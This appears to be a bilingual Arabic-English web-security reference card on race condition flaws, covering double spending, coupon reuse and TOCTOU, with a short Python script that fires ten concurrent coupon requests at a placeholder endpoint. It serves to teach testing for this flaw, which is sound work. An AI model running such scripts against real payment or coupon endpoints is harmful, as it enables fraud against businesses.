Race Conditions — The Hidden Logic Flaw

HIGH OWASP A04
AR

Race Condition (حالة السباق) هي ثغرة منطقية تحدث عندما يعالج التطبيق طلبات متعددة بشكل متزامن دون التحقق السليم من الحالات المتتالية في قاعدة البيانات. يسمح هذا للمهاجمين بالقيام بـ "شراء مزدوج" (Double Spending) أو تطبيق كود خصم واحد عدة مرات قبل تحديث قيمته في السيرفر.

EN

Race Condition is a logical vulnerability that occurs when an application processes multiple concurrent requests without proper database state locking. This enables attackers to perform "double spending" or apply a single coupon multiple times before the server updates its status.

أنواع ثغرات Race Conditions / Vulnerability Types

Double Spending / Payment Abuse

إرسال طلبات سحب أو تحويل أموال متزامنة للحصول على مبلغ مضاعف من رصيد وحيد.

Coupon / Gift Card Re-use

استخدام كود خصم وحيد مئات المرات متزامناً لتخفيض السعر للصفر.

File Upload Collision

رفع ملف وتعديله قبل إجراء الفحص الأمني (TOCTOU).

TOCTOU (Time-of-Check to Time-of-Use)

الفارق الزمني بين عملية التحقق الأمنية وبين التعديل الفعلي للبيانات.

أوامر وسيناريوهات الاختبار / Testing & Scripts

يتم اختبار هذه الثغرة بإرسال طلبات متزامنة في نطاق جزء من الثانية (Miliseconds) باستخدام Turbo Intruder في Burp Suite:

# Python script using requests-racer for parallel threads
from requests_racer import Racers
import requests

racers = Racers()
url = "https://target.com/api/coupons/apply"
headers = {"Authorization": "Bearer TOKEN"}
data = {"coupon": "DISCOUNT100"}

# Prepare multiple requests to be fired concurrently
for i in range(10):
    requests.post(url, headers=headers, json=data, hooks={'pre_send': racers.racer_hook()})

# Firing all requests at the exact same millisecond
racers.fire()
